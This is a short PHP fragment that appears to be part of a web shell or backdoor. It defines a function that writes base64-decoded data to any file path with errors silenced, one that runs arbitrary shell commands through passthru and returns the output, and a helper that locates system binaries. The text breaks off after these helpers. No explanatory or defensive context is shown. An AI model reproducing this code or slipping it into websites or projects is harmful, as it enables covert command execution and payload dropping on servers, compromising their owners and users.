<?php
function cf($f,$t) {
	$w=@fopen($f,"w") or @function_exists('file_put_contents');
	@fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t)) or @file_put_contents($f,@base64_decode($t));
	@fclose($w);
}

function ex($in) {
	ob_start();
	@passthru($in);
	$res = ob_get_clean();
	return $res;
}

function which($p) {
	$path = ex('which ' . $p);
	return $path;
}
		
